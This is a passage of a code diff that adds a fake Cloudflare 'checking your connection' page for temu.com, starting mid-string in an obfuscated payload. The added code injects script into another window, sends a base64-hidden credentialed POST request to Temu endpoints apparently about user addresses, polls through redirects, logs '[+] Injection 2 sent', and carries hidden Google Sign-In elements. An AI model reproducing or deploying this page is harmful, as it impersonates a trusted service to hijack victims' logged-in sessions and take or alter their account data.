WdlX25hbWU9YWRkcmVzcyZyZWZlcl9wYWdlX2lkPTEwMDE4XzE3Njc5NzMwNTAxMThfb254aGg4YmI2cyZyZWZlcl9wYWdlX3NuPTEwMDE4IiwKICAgICJtZXRob2QiOiAiUE9TVCIsCiAgICAibW9kZSI6ICJjb3JzIiwKICAgICJjcmVkZW50aWFscyI6ICJpbmNsdWRlIiwKfSk7'))>");
+              }
+            } catch (e) { /* cross-origin during redirect, keep polling */ }
+          }, 500);
+          <\/script>
+          \`)
+        `, '*');
+          console.log('[+] Injection 2 sent');
+
+        })();
+      </script>
+      <div id="message" class="core-msg spacer spacer-top">temu.com needs to review the security of your connection
+        before proceeding.</div>
+      <div id="PZFW8" style="display: none">
+        <div id="challenge-success-text" class="h2">Verification successful</div>
+        <div class="core-msg spacer">Waiting for temu.com to respond...</div>
+      </div>
+      <noscript>
+        <div class="h2"><span id="challenge-error-text">Enable JavaScript and cookies to continue</span></div>
+      </noscript>
+    </div>
+  </div>
+  <div class="footer" role="contentinfo">
+    <div class="footer-inner">
+      <div class="clearfix diagnostic-wrapper">
+        <div class="ray-id">Ray ID: <code>917170d73d259711</code></div>
+      </div>
+      <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer"
+          href="https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=m" target="_blank">Cloudflare</a>
+      </div>
+    </div>
+  </div>
+  <!-- Google Sign In required elements -->
+  <style>
+    .g_id_signin,
+    #g_id_onload {
+      display: none;
+    }
+  </style>
+  <div id="g_id_onload" data-client_id="{{ google_client_id }}"></div>
+  <div class="g_id_signin" data-type="standard"></div>
+</body>
+
+
+</html>
